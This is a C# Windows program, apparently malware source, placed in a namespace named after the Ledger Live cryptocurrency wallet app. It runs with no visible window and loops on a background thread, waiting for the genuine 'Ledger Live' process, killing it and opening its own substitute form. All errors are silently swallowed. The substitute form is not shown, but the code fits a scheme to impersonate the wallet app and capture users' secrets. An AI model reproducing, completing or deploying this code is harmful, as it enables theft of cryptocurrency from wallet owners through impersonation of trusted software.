using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Ledger_Live
{
    internal static class Program
    {
        private static Thread thread;

        [STAThread]
        private static void Main()
        {
            try
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                // Subscribe to Application.Idle event
                Application.Idle += Application_Idle;

                Application.Run();
            }
            catch (Exception e) { }
        }

        private static void Application_Idle(object sender, EventArgs e)
        {
            try
            {
                // Unsubscribe from Application.Idle event
                Application.Idle -= Application_Idle;

                // Start the thread
                thread = new Thread(KillLoop);
                thread.Start();
            }
            catch (Exception ee) { }
        }

        public static void KillLoop()
        {
            try
            {
                while (IsLooped)
                {
                    string processName = "Ledger Live";
                    Process[] array = null;
                    while (array == null || array.Length == 0)
                    {
                        array = Process.GetProcessesByName(processName);
                    }
                    Process process = array[0];
                    try
                    {
                        process.Kill();
                        Open();
                    }
                    catch
                    {
                        // Handle the exception if necessary
                    }
                }
            }
            catch (Exception e) { }
        }

        [STAThread]
        public static void Open()
        {
            try
            {
                Application.Run(new Form1());
            }
            catch (Exception e) { }
        }

        public static bool IsLooped = true;
    }
}
